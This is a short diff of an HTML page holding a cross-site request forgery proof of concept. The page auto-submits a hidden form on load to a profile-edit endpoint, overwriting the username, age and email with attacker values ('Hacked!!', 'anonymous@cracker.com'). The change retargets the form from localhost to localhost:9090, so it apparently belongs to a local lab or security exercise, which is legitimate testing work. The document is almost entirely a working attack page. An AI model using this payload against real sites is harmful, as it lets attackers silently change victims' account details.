@@ -7,7 +7,7 @@
 <link rel="stylesheet" href="./assets/style.css" type="text/css"> 
 <body onload="document.csrf.submit();">
 <p>aaaaa</p>
-<form name="csrf" action="http://localhost/profile/edit/update" method="POST">
+<form name="csrf" action="http://localhost:9090/profile/edit/update" method="POST">
     <input type="hidden" name="username" value="Hacked!!">
     <input type="hidden" name="age" value="2048">
     <input type="hidden" name="mail" value="anonymous@cracker.com">
